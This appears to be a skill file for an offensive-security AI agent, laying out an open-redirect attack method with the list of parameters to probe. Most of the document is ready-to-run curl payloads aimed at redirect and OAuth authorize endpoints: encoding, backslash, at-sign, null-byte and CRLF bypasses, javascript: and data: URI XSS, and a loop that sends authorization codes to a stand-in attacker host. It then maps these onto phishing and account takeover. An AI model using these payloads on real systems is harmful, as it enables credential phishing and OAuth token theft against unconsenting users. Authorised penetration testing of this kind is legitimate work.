---
name: attack-open-redirect
description: Point a server-side redirect at a domain you control — protocol-relative, encoded, double-encoded, backslash and at-sign payloads against url, next, returnTo, callback and redirect_uri parameters, escalating to OAuth token theft where the callback is unvalidated. Reach for it when a login, logout or callback parameter carries a URL.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-open-redirect/SKILL.md
    commit: 359655518
---

# Open Redirect

## Objective

Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.

## Testing Methodology

### Phase 1: Identify Redirect Parameters

Common parameter names:
```
url, redirect, redirect_url, redirect_uri, return, return_url, returnTo,
next, goto, target, dest, destination, rurl, redir, forward, continue,
callback, path, out, view, login_url, image_url, go, link, ref
```

### Phase 2: Basic Payloads

```bash
# Direct redirect
curl -s -D- "https://TARGET/redirect?url=https://evil.com"

# Protocol-relative
curl -s -D- "https://TARGET/redirect?url=//evil.com"

# Encoded
curl -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"

# Backslash bypass
curl -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"

# At-sign bypass
curl -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
```

### Phase 3: Filter Bypass

```bash
# Subdomain matching
curl -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"

# URL encoding tricks
curl -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"

# Double encoding
curl -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"

# Null byte
curl -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"

# CRLF + Location header
curl -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"

# JavaScript scheme
curl -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"

# Data URI
curl -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Phase 4: OAuth Token Theft

```bash
# Test OAuth redirect_uri handling — curl requesting the authorize endpoint
# with an attacker-controlled redirect_uri
curl -s -D- "https://TARGET/oauth/authorize?client_id=CLIENT_ID&response_type=code&redirect_uri=https://attacker.com/callback&scope=openid"

# Sweep redirect_uri bypass variants: attacker domain, subdomain, path-relative,
# and traversal-based domain confusion
for uri in "https://attacker.com" "https://TARGET.attacker.com" \
           "https://TARGET/callback.attacker.com" "https://TARGET/callback/../../attacker.com"; do
  echo "redirect_uri: $uri"
  curl -s -D- -o /dev/null \
    "https://TARGET/oauth/authorize?client_id=CLIENT_ID&response_type=code&redirect_uri=$uri&scope=openid" \
    | grep -i "location"
done
```

If redirect_uri accepts attacker domain, the OAuth code/token is sent to the attacker.

### Phase 5: Impact Escalation

- Redirect in login flow → credential phishing
- Redirect in OAuth flow → token theft (P1)
- Redirect in email verification → account takeover
- Redirect + SSRF → internal access

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Open redirect + OAuth token theft | Critical (P1) |
| Open redirect in login/auth flow | High (P2) |
| Generic open redirect | Medium (P3) |
| JavaScript scheme redirect (XSS) | High (P2) |

## Evidence Requirements

- URL with redirect parameter and payload
- Response showing 302/301 to attacker domain
- For OAuth: stolen authorization code/token
- Location header value in response

## Tools

- curl loop against the authorize endpoint (see Phase 4) — OAuth redirect_uri bypass testing
- `curl` — manual redirect testing

## References

- [PortSwigger: Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [OWASP: Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
